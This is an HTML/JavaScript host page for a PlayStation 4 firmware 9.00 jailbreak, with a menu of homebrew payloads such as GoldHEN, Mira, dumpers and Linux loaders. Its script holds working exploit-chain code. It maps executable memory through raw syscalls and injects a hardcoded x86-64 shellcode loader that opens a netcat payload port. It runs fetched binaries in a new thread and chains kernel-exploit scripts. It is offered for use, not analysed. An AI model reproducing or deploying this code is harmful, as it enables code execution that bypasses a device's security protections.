<html>
<head>
<title>Kameleon 900 Manual Lite ESP32-S2 Hybrid</title>
<link rel="shortcut icon" href="favicon.ico"></link>
<link rel="stylesheet" href="btn.css">
<style>
body{background-image: url("bg.jpg");background-repeat: no-repeat;background-size:70%;background-position: center;background-color: black;
color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}
.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: white;transform: translate(-50%, -50%);}
</style>

<script>
//Initialization of variables
var payloadData = "";
var PLfile = "";
var usbWaitTime = sessionStorage.getItem('waittime');
localStorage.setItem("ipaddress","127.0.0.1");
sessionStorage.setItem("isghenbinserver","no");
sessionStorage.setItem("isWebKitdone","no");
sessionStorage.setItem("pltype","");

//Functionns
//////////// MOD FOR ESP32-S2 CHIPS //////////
// usb functions - stooged
if (!usbWaitTime)
{
  usbWaitTime = 10000; //default if empty
}

function disableUSB() 
{
  var getpl = new XMLHttpRequest();
  getpl.open("POST", "./usboff", true);
  getpl.send(null);
}

function enableUSB() 
{
  var getpl = new XMLHttpRequest();
  getpl.open("POST", "./usbon", true);
  getpl.send(null);
}

function sleep(milliseconds) 
{
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

function exec_payload()
{
if (sessionStorage.isghenbinserver == "no")
{
    if (sessionStorage.isWebKitdone == "no")
    {
        sessionStorage.pltype = "oob";
        setTimeout(poc, 500);
    }
    else
    {
        loadPayloadData();
    }
}
else
{
    LoadpayloadGoldHEN(PLfile);
}
}

function exec_payload_gh()
{
    if (sessionStorage.isghenbinserver == "no")
{
        if (sessionStorage.isWebKitdone == "no")
        {
        sessionStorage.pltype = "oob";
        setTimeout(poc, 500);
        }
        else
        {
        loadPayloadData();
        }
}
else
{
    if (confirm(PLfile + " " +  "cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
    {
        if (sessionStorage.isWebKitdone == "no")
        {
        sessionStorage.pltype = "oob";
        setTimeout(poc, 500);
        }
        else
        {
        loadPayloadData();
        }
        sessionStorage.isghenbinserver = "yes";
    }
}
}

function pldone() 
{
  msgs.innerHTML= LoadedMSG;
}

function awaitpl() 
{
  msgs.innerHTML= "You can send now any payload over netcat port 9020";
}

function jbdone() 
{
  mymenu.style.display = "block";
  msgs.innerHTML= LoadedMSG;
}

function wk_keep_alive()
{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', document.location.href, false);
    xhr.send('');
}
function print(){}

function getScript(source,callback){var gs=document.createElement('script');gs.src=source;gs.onload=callback;gs.async=false;document.body.appendChild(gs);}
function loadScript(name)
{
	getScript(name,function(){});
}

//Function to 'Load' the payload file to be send to GoldHEN Bin Server.	
var getPayload=function(payload,onLoadEndCallback){
		var req=new XMLHttpRequest();
		req.open('GET',payload);
		req.send();
		req.responseType="arraybuffer";
		req.onload=function(event){
			if(onLoadEndCallback)onLoadEndCallback(req,event);
		};
	};
	
//Function to 'Send' the payload file to GoldHEN Bin Server using Html POST method. 
	var sendPayload=function(url,data,onLoadEndCallback){
		var req=new XMLHttpRequest();
		req.open("POST",url,true);
		req.send(data);
		req.onload=function(event){
			if(onLoadEndCallback)onLoadEndCallback(req,event);
		};
	};

//function to check current status of the GoldHEN Bin Server
function checkbinserverstatus()
{
	var req = new XMLHttpRequest(); 
	req.open("POST", "http://"+localStorage.ipaddress+":9090/status");
	req.send();
	req.onerror = function(){
		msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>GoldHEN Bin Server Not Detected, Payloads Will Run Via WebKit!!!</h1>";
		sessionStorage.isghenbinserver = "no";
	};
	req.onload = function(){
	var responseJson = JSON.parse(req.responseText);
	if (responseJson.status=="ready"){
		msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>GoldHEN Bin Server Detected, Payloads Will Run Via Port 9090!!!</h1>";
		sessionStorage.isghenbinserver = "yes";
		}
	};
}

function loadPayloadData()
{
        if (PLfile)
        {
        //----------------------------------------------------------------------------------------------
        //Buffer Array Method By Leeful
        var req = new XMLHttpRequest();
        req.responseType = "arraybuffer";
        req.open('GET',PLfile);
        req.send();
        req.onreadystatechange = function () 
        {
        if (req.readyState == 4) 
        {
        PLD = req.response;
        var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
        var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
        var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
        var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
        tmp.set(new Uint8Array(req.response), 0);
        tmp.set(padding, req.response.byteLength);
        var shellcode = new Uint32Array(tmp.buffer);
        pl.set(shellcode,0);
        var pthread = p.malloc(0x10);
        chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
        pldone();
        sessionStorage.pltype = "";
        }
        };
        }
}

//Payloads to be loaded using Sleirsgoevy Style
function loadPayloadDataSleirs(pl) // preload payload data
{
if (sessionStorage.isWebKitdone == "yes") //OOB or WebKit Exploit Done!!! TODO
{
    if (sessionStorage.pltype == "linux")
  {
	setTimeout(loadScript("netcat.js")
	+loadScript("malloc.js")
	+loadScript("rop_sleirs.js")
	+loadScript("syscalls.js")
	+loadScript("syscalls2.js")
	+loadScript(pl)
	+loadScript("jbc_ldr.js")
	+loadScript("relocator.js"),1500);
    sessionStorage.pltype = "";
    pldone();
  }
  else if (sessionStorage.pltype == "binserver9021" || sessionStorage.pltype == "mira")
  {
    setTimeout(loadScript("netcat.js")
	+loadScript("malloc.js")
	+loadScript("rop_sleirs.js")
	+loadScript("syscalls.js")
	+loadScript("syscalls2.js")
	+loadScript(pl)
	+loadScript("mira_ldr.js")
	+loadScript("relocator.js"),1500);
    sessionStorage.pltype = "";
    pldone();
  }

}
else //NO OOB or WebKit Exploit Done!!!
{
    if (sessionStorage.pltype == "linux")
  {
    setTimeout(loadScript("netcat.js")
     +loadScript("exploit.js")
	 +loadScript("malloc.js")
	 +loadScript("rop_sleirs.js")
	 +loadScript("syscalls.js")
	 +loadScript("syscalls2.js")
     +loadScript("jbc_ldr.js")
     +loadScript(pl)
     +loadScript("int64.js")
     +loadScript("rop.js")
     +loadScript("kexploit.js")
     +loadScript("kexploit-launcher.js")
     +loadScript("relocator.js"),1500);
     sessionStorage.pltype = "";
     pldone();
  }
  else if (sessionStorage.pltype == "binserver9021" || sessionStorage.pltype == "mira")
  {
    setTimeout(loadScript("netcat.js")
    +loadScript("exploit.js")
	 +loadScript("malloc.js")
	 +loadScript("rop_sleirs.js")
	 +loadScript("syscalls.js")
	 +loadScript("syscalls2.js")
     +loadScript("mira_ldr.js")
     +loadScript(pl)
     +loadScript("int64.js")
     +loadScript("rop.js")
     +loadScript("kexploit.js")
     +loadScript("kexploit-launcher.js")
     +loadScript("relocator.js"),1500);
     sessionStorage.pltype = "";
     pldone();
  }
}
}

//Payloads to be loaded over GoldHEN Bin Server method
function LoadpayloadGoldHEN(PLfile){ //Loading Payload via Payload Param.
	   // First do an initial check to see if the BinLoader server is running, ready or busy.
	   var req = new XMLHttpRequest(); 
	   req.open("POST", "http://"+localStorage.ipaddress+":9090/status");
	   req.send();
	   req.onerror = function(){
		   alert("Cannot Load Payload Because The BinLoader Server Is Not Running");//<<If server is not running, alert message.
		   return;
	   };
		req.onload = function(){
			var responseJson = JSON.parse(req.responseText);
			if (responseJson.status=="ready"){
		    getPayload(PLfile, function (req) {
				if ((req.status === 200 || req.status === 304) && req.response) {
				   //Sending bins via IP POST Method
					sendPayload("http://" + localStorage.ipaddress + ":9090", req.response, function (req) {
					   if (req.status === 200) {
						pldone();
					   }else{msgs.innerHTML = 'Cannot send payload';return;}
					})
				}
			});
			}
			else {
				alert("Cannot Load Payload Because The BinLoader Server Is Busy");//<<If server is busy, alert message.
				return;
			}
		};
	}

    function exec_binserver9020()
{
    var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    var payload_loader = p.malloc32(0x1000);
    var loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;
    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
    var pthread = p.malloc(0x10);
    //
    {
        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
    }
    chain.run();
    awaitpl();
}

function load_binserver9021()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9021!!!</h1>";
LoadedMSG="You Can Send Now Payloads Via Netcat To Port 9021";
PLfile = "mira_ldr.bin"; //GoldHEN Bin Server Only
sessionStorage.pltype = "binserver9021";

if (sessionStorage.isghenbinserver == "yes")
{
LoadpayloadGoldHEN(PLfile);
}
else
{
loadPayloadDataSleirs("");
}
}

function load_binserver9020()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9020!!!</h1>";
LoadedMSG="You Can Send Now Payloads Via Netcat To Port 9020";
sessionStorage.pltype = "binserver9020";

if (sessionStorage.isghenbinserver == "yes")
{
    if (confirm("Bin Server Port 9020 cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
    {
        if (sessionStorage.isWebKitdone == "no")
        {
        setTimeout(poc, 500);
        }
        else
        {
        exec_binserver9020();
        }
        sessionStorage.isghenbinserver = "yes";
    }
}
else
{
        if (sessionStorage.isWebKitdone == "no")
        {
        setTimeout(poc, 500);
        }
        else
        {
        exec_binserver9020();
        }
        sessionStorage.isghenbinserver = "yes";
}
}

function load_goldhen23(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading GoldHEN v2.3 Please wait!!!</h1>";
LoadedMSG="GoldHEN v2.3 Loaded";
PLfile ="pl_goldhen23.bin";
exec_payload();
}

function load_mira(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Mira 9.00. Please wait!!!</h1>";
LoadedMSG="Mira 9.00 Loaded";
PLfile ="pl_mira.js";
sessionStorage.pltype = "mira";
loadPayloadDataSleirs(PLfile);
}

function load_webactivator(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSN Account Offline Web Activator. Please wait!</h1>";
var link = document.createElement('a');
document.body.appendChild(link);
link.href = '900.html';
link.click();
}

function load_pkg_backup(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PKG-BackUP v1.1. Please wait!</h1>";
LoadedMSG="PKG-BackUP v1.1 Loaded";
PLfile = "pl_pkg_backup.bin";
exec_payload();
}

function load_orbistoolbox(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Orbis Tool Box v1190. Please wait!</h1>";
LoadedMSG="Orbis Tool Box v1190 Loaded";
PLfile = "pl_OrbisToolbox.bin";
exec_payload();
}

function load_disableupdates(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Disable-Updates. Please wait!</h1>";
LoadedMSG="Disable-Updates Loaded";
PLfile = "pl_disableupdates.bin";
exec_payload();
}

function load_enableupdates(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Updates. Please wait!</h1>";
LoadedMSG="Enable-Updates Loaded";
PLfile = "pl_enableupdates.bin";
exec_payload();
}

function load_backup(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading DB-Backup. Please wait!</h1>";
LoadedMSG="DB-Backup Loaded";
PLfile = "pl_backup.bin";
exec_payload();
}

function load_app2usb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading App-To-Usb. Please wait!</h1>";
LoadedMSG="App-To-Usb Loaded";
PLfile = "pl_app2usb.bin";
exec_payload();
}

function load_dumper(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading App Dumper. Please wait!</h1>";
LoadedMSG="App Dumper Loaded";
PLfile = "pl_appdumper.bin";
exec_payload_gh();
}

function load_exitidu(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Exitidu. Please wait!</h1>";
LoadedMSG="Exitidu Loaded";
PLfile = "pl_exitidu.bin";
exec_payload();
}

function load_rifrenamer(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Rifrenamer. Please wait!</h1>";
LoadedMSG="Rifrenamer Loaded";
PLfile = "pl_rifrenamer.bin";
exec_payload();
}

function load_enablebrowser(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Browser. Please wait!</h1>";
LoadedMSG="Enable-Browser Loaded";
PLfile = "pl_enablebrowser.bin";
exec_payload();
}

function load_ftp(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Ftp. Please wait!</h1>";
LoadedMSG="Ftp Loaded";
PLfile = "pl_ftp.bin";
exec_payload();
}

function load_historyblocker(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading History-Blocker. Please wait!</h1>";
LoadedMSG="History-Blocker Loaded";
PLfile = "pl_historyblocker.bin";
exec_payload_gh();
}

function load_kerneldumper(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Kernel-Dumper. Please wait!</h1>";
LoadedMSG="Kernel-Dumper Loaded";
PLfile = "pl_kerneldumper.bin";
exec_payload();
}

function load_moduledumper(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Kernel Module-Dumper. Please wait!</h1>";
LoadedMSG="Kernel Module-Dumper Loaded";
PLfile = "pl_moduledumper.bin";
exec_payload();
}

function load_uart(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Permanent UART. Please wait!</h1>";
LoadedMSG="Permanent UART Loaded";
PLfile = "pl_permanentuart.bin";
exec_payload();
}

/////////////LINUX NAZKY
function load_Linux1gb()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 1gb. Please wait!</h1>";
LoadedMSG="NazkyYT Linux 1gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_Linux1gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_Linux2gb()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 2gb. Please wait!</h1>";
LoadedMSG="NazkyYT Linux 2gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_Linux2gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_Linux3gb()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 3gb. Please wait!</h1>";
LoadedMSG="NazkyYT Linux 3gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_Linux3gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_Linux4gb()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 4gb. Please wait!</h1>";
LoadedMSG="NazkyYT Linux 4gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_Linux4gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_Linux5gb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 5gb. Please wait!</h1>";
LoadedMSG="NazkyYT Linux 5gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_Linux5gb.js";
loadPayloadDataSleirs(PLfile);
}

/////////////LINUX PSXITA
function load_psxita_Linux1gb()
{
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 1gb. Please wait!</h1>";
LoadedMSG="PSXita Linux 1gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_1gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_Linux2gb(){
LoadedMSG="PSXita Linux 2gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_2gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_Linux3gb()
{
LoadedMSG="PSXita Linux 3gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_3gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_Linux4gb()
{
LoadedMSG="PSXita Linux 4gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_4gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_Linux5gb()
{
LoadedMSG="PSXita Linux 5gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_5gb.js";
loadPayloadDataSleirs(PLfile);
}

/////////////LINUX PSXITA FOR PRO CONSOLES
function load_psxita_pro_Linux1gb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 1gb. Please wait!</h1>";
LoadedMSG="PSXita-PRO Linux 1gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_pro_1gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_pro_Linux2gb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 2gb. Please wait!</h1>";
LoadedMSG="PSXita-PRO Linux 2gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_pro_2gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_pro_Linux3gb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 3gb. Please wait!</h1>";
LoadedMSG="PSXita-PRO Linux 3gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_pro_3gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_psxita_pro_Linux4gb(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 4gb. Please wait!</h1>";
LoadedMSG="PSXita-PRO Linux 4gb Loaded";
sessionStorage.pltype = "linux";
PLfile = "pl_psxita_pro_4gb.js";
loadPayloadDataSleirs(PLfile);
}

function load_whos_southbridge(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Whos That South-Bridge v2 . Please wait!</h1>";
LoadedMSG="Whos That South-Bridge v2 Loaded";
PLfile = "pl_wtsb.bin";
exec_payload();
}

function load_ps4debug(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading CTN Ps4Debug v1.0.15. Please wait!</h1>";
LoadedMSG="CTN Ps4Debug v1.0.15 Loaded";
PLfile = "pl_ps4debug.bin";
exec_payload();
}

function load_restore(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading DB-Restore. Please wait!</h1>";
LoadedMSG="DB-Restore Loaded";
PLfile = "pl_restore.bin";
exec_payload();
}

function load_todex(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Dex. Please wait!</h1>";
LoadedMSG="ToDex Loaded";
PLfile = "pl_todex.bin";
exec_payload();
}

function load_webrte(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading WebRTE. Please wait!</h1>";
LoadedMSG="WebRTE Loaded";
PLfile = "pl_webrte.bin";
exec_payload();
}

function load_disableaslr(){
msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Disable-ASLR. Please wait!</h1>";
LoadedMSG="Disable-ASLR Loaded";
PLfile = "pl_disableaslr.bin";
exec_payload();
}

</script>
</head>

<body onload="checkbinserverstatus();">
    <h1 id=msgs style='font-size:25px;text-align:center;color:white'>Kameleon 900 Manual Lite ESP32-S2</h1>
    <div id=mymenu style="text-align:center;">
      <div text-align= center>Pass = <span id=passCounter></span>&nbsp;&nbsp;:&nbsp;&nbsp;Fail = <span id=failCounter></span></div>
      <div style="width:100%;font-size:20px;color:white">
      PS4 Firmware <span id="PS4fw"></span></div>
      <div id="pldmenu" style=font-size:16px>
      <br>
      <div style=font-size:16px>BIN LOADER</div>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9020 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_binserver9020(); return false">Binloader-9020</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9021 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_binserver9021(); return false">Binloader-9021</button>
      <br>
      <div style=font-size:16px>GOLDHEN / MIRA</div>
      <button class="btnkme" onMouseOver="msgs.innerHTML='GoldHEN v2.3 - By SiSTRo'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_goldhen23(); return false">GoldHEN v2.3</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Mira For 9.00 - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_mira(); return false">Mira 9.00</button>
      <br>
      <div style=font-size:16px>PAYLOADS</div>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Modded Version of App Dumper to Backup PKG files to External HDD  / 9.00 Mod by Kameleon'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_pkg_backup(); return false">PKG-BackUp v1.1</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Orbis Tool Box v1190 - By OSM'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_orbistoolbox(); return false">Orbis-Tool-Box</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='App Dumper Only v1.8 - Original Version By xVortex / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_dumper(); return false">App-Dumper</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_disableupdates(); return false">Disable-Updates</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_enableupdates(); return false">Enable-Updates</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable Browser / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_enablebrowser(); return false">Enable-Browser</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Exit IDU / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_exitidu(); return false">Exit-IDU</button>
    <br><br>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Rifrenamer / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_rifrenamer(); return false">Rif-Renamer</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Ftp v1.3 - Original Version By xVortex / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_ftp(); return false">Ftp-Server</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='History-Blocker - v2.0 Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_historyblocker(); return false">History-Blocker</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Dumper - v1.0 Original Version By Eversion / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_kerneldumper(); return false">Kernel-Dumper</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='PSN Account Offline Web Activator - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_webactivator(); return false">Web-Offline-Activator</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Ps4Debug v1.0.15 - By CTN123'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_ps4debug(); return false">Ps4Debug v1.0.15</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Backup v1.0 - By Leeful / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_backup(); return false">DB-Backup</button>
    <br><br>
    <button class="btnkme" onMouseOver="msgs.innerHTML='App-2-Usb - Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_app2usb(); return false">App-2-Usb</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Restore v1.0 - By Leeful / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_restore(); return false">DB-Restore</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='To-Dex v1.0 - By notzecoxao'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_todex(); return false">To-Dex</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='WebRTE v1.0 - By PS4 Trainer'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_webrte(); return false">WebRTE</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Permanent UART - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_uart(); return false">Permanent-UART</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable ASLR - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_disableaslr(); return false">Disable-ASLR</button>
    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Module Dumper -  9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_moduledumper(); return false">Kernel-Module-Dumper</button>
    </div>
    <br><br>
    <a id="linuxl" ><button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loaders Payloads'" ; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" type="button">Linux Vram Payloads</button></a>
    <div id="linuxlJ" style="display: none;">
      <br>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Whos that South-Bridge (Aeolia, Belize, Baikal) - 9.00 Port By OrbisUnjailed'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_whos_southbridge(); return false">Whos that South-Bridge</button>
      <br><br>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux1gb(); return false">NazkyYT Linux 1GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux2gb(); return false">NazkyYT Linux 2GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux3gb(); return false">NazkyYT Linux 3GB Vram</button>
